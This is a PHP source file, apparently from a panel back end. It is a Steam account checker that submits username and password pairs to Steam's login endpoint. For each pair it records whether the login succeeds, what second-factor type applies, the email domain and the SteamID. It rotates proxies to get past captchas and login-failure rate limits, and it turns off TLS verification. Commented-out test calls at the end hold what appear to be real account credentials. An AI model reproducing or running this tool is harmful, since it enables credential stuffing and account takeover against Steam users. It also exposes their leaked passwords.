<?php
	require_once("../php/phpseclib/vendor/autoload.php");
	require_once("../php/classPanel.php");

	use phpseclib\Math\BigInteger;
	use phpseclib\Crypt\RSA;


	function checkValid($login, $password) {
		
		$get_encrypt = post(
			'https://store.steampowered.com/login/getrsakey?',
			array(
				'params' => 'username='.$login.'',
				'headers' => array(
					'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
					'content-type: application/x-www-form-urlencoded',
					'user-agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36'
				)
			)
		);
	  
		preg_match("/publickey_mod...(.*?)\"/", $get_encrypt['headers'], $publickey_mod);
		$publickey_mod = $publickey_mod[1];
		
		preg_match("/publickey_exp...(.*?)\"/", $get_encrypt['headers'], $publickey_exp);
		$publickey_exp = $publickey_exp[1];
		
		preg_match("/timestamp...(.*?)\"/", $get_encrypt['headers'], $timestamp);
		$timestamp = $timestamp[1];


		$RSA = new RSA();
		$RSA->setEncryptionMode(RSA::ENCRYPTION_PKCS1);

		$key = array(
			'modulus'        => new BigInteger($publickey_mod, 16),
			'publicExponent' => new BigInteger($publickey_exp, 16)
		);

		$RSA->loadKey($key, RSA::PUBLIC_FORMAT_RAW);
		$encryptedPassword = urlencode(base64_encode($RSA->encrypt($password)));
		$encryptedPassword = str_replace('/','%2F',$encryptedPassword);
		$encryptedPassword = str_replace('+','%2B',$encryptedPassword);
		$encryptedPassword = str_replace('=','%3D',$encryptedPassword);
		
		$get_logon = post(
			'https://store.steampowered.com/login/dologin?',
			array(
				'params' => 'username='.$login.'&password='.$encryptedPassword.'&rsatimestamp='.$timestamp.'',
				'headers' => array(
					'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
					'content-type: application/x-www-form-urlencoded',
					'user-agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.86 Safari/537.36'
				)
			)
		);
		
		$dataDecoded = json_decode($get_logon['content'], true);
		// print_r($get_logon);
		
		$res = ["result" => null, "type" => null, "emaildomain" => null, "steamid" => null];
		
		if ($dataDecoded["success"] == true) { 
			$res["result"] = true; 
			$res["steamid"] = getSteamIdFromCookies($get_logon['cookies']); 
		}
		else if ($dataDecoded["requires_twofactor"] == true) { 
			$res["result"] = true; 
			$res["type"] = "phone"; 
			$res["steamid"] = getSteamIdFromCookies($get_logon['cookies']); 
		}
		else if ($dataDecoded["emailauth_needed"] == true) { 
			$res["result"] = true; 
			$res["type"] = "email"; 
			$res["emaildomain"] = $dataDecoded["emaildomain"]; 
			$res["steamid"] = getSteamIdFromCookies($get_logon['cookies']); 
		}
		else { 
			$res["result"] = false; 
			$res["type"] = "incorrect"; 
		}
		
		return $res;
	}

	function getSteamIdFromCookies($cookies) {
		$cookies = urldecode($cookies);
		preg_match("/steamLoginSecure=(\d+)||/", $cookies, $matches, PREG_OFFSET_CAPTURE);
		return $matches[1][0];
	}
	
    function post($url = null, $params = null)
    {
		$useProxy = false;
		$try = true;
		
		
		$Panel = new classPanel();
		
		$proxies = null;
		if ($Panel->int_GetProxyActivity() > 0) {
			$proxies = $Panel->arr_GetProxies();
		}
		
		$steps = count($proxies);
		$step = 0;
		
        do {
			$ch = curl_init();

			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_HEADER, 1);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);

			if(isset($params['params'])) {
				curl_setopt($ch, CURLOPT_POST, 1);
				curl_setopt($ch, CURLOPT_POSTFIELDS, $params['params']);
			}

			if(isset($params['headers'])) curl_setopt($ch, CURLOPT_HTTPHEADER, $params['headers']);

			if(isset($params['cookies'])) curl_setopt($ch, CURLOPT_COOKIE, $params['cookies']);

			if($proxies != null && $useProxy != false) {
				$proxy = isset($proxies[$step]) ? $proxies[$step] : null;
				curl_setopt($ch, CURLOPT_PROXY, $proxy);
				$step++;
			}

			$result = curl_exec($ch);
			$result_explode = explode("\r\n\r\n", $result);

			$headers = ((isset($result_explode[0])) ? $result_explode[0]."\r\n" : '').''.((isset($result_explode[1])) ? $result_explode[1] : '');
			
			$content = $result_explode[count($result_explode) - 1];
			
			preg_match_all('|Set-Cookie: (.*);|U', $headers, $parse_cookies);
			$cookies = implode(';', $parse_cookies[1]);
			
			curl_close($ch);
			
			$output = array('headers' => $headers, 'cookies' => $cookies, 'content' => $content);
 
			$dataDecoded = json_decode($output["content"], true);
			
			if ($output["content"] == "") {
				$useProxy = true;
			}
			else if (isset($dataDecoded["captcha_needed"]) && $dataDecoded["captcha_needed"] == 1){
				$useProxy = true;
			}
			else if(isset($dataDecoded["message"]) && 
					($dataDecoded["message"] == "There have been too many login failures from your network in a short time period.  Please wait and try again later.")) {
				$useProxy = true;
			}
			else $try = false;
			
        } while($try && ($step < $steps));
       
		return $output;
    }
	
	// checkValid("balgin52", "Alordqwer1");
	// print_r(checkValid("playback68", "kisakisa0001"));
//print_r(checkValid("balgin52", "Alordqwer1"));
//print_r(checkValid("caztede", "Aion8246"));
?>